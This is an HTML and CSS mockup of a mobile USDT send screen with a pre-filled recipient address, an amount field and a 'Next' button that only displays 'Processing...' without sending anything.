<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>USDT Payment</title>
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen;
      background: #ffffff;
      color: #000;
      padding: 20px;
    }

    .container {
      max-width: 400px;
      margin: 0 auto;
    }

    .label {
      font-weight: 600;
      font-size: 16px;
      margin: 20px 0 8px;
    }

    .input-wrapper {
      position: relative;
    }

    .input-wrapper input {
      width: 100%;
      padding: 14px;
      padding-right: 70px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 12px;
    }

    .max-btn, .clear-btn {
      position: absolute;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      font-weight: bold;
      cursor: pointer;
      color: #007bff;
    }

    .max-btn {
      right: 10px;
    }

    .clear-btn {
      right: 50px;
      font-size: 18px;
      color: #999;
    }

    .amount-usd {
      margin-top: 6px;
      font-size: 14px;
      color: #666;
    }

    .button {
      margin-top: 80px;
      width: 100%;
      background: #0052ff;
      border: none;
      padding: 16px;
      font-size: 18px;
      color: white;
      border-radius: 14px;
      cursor: pointer;
      font-weight: bold;
      transition: all 0.3s ease-in-out;
    }

    .button:disabled {
      background: #999;
      cursor: default;
    }

    .fade-in {
      animation: fadeIn 0.4s ease-in-out;
    }

    @keyframes fadeIn {
      0% { opacity: 0; transform: scale(0.95); }
      100% { opacity: 1; transform: scale(1); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="label">Address or Domain Name</div>
    <div class="input-wrapper">
      <input type="text" value="0x79069192614f7ceE4F..." readonly />
      <button class="clear-btn" onclick="clearText()">Ã—</button>
      <button class="max-btn" onclick="pasteAddress()">Paste</button>
    </div>

    <div class="label">Amount</div>
    <div class="input-wrapper">
      <input type="number" placeholder="0.00" id="amount" />
      <button class="max-btn" onclick="setMax()">Max</button>
    </div>

    <div class="amount-usd">= $0.00</div>

    <button class="button" id="nextBtn">Next</button>
  </div>

  <script>
    function pasteAddress() {
      navigator.clipboard.readText().then(text => {
        document.querySelector('input[type="text"]').value = text;
      });
    }

    function clearText() {
      document.querySelector('input[type="text"]').value = "";
    }

    function setMax() {
      document.getElementById("amount").value = "100";
      document.querySelector(".amount-usd").innerText = "= $100.00";
    }

    const btn = document.getElementById("nextBtn");
    btn.addEventListener("click", () => {
      btn.disabled = true;
      btn.innerText = "Processing...";
      btn.classList.add("fade-in");
    });
  </script>
</body>
</html>
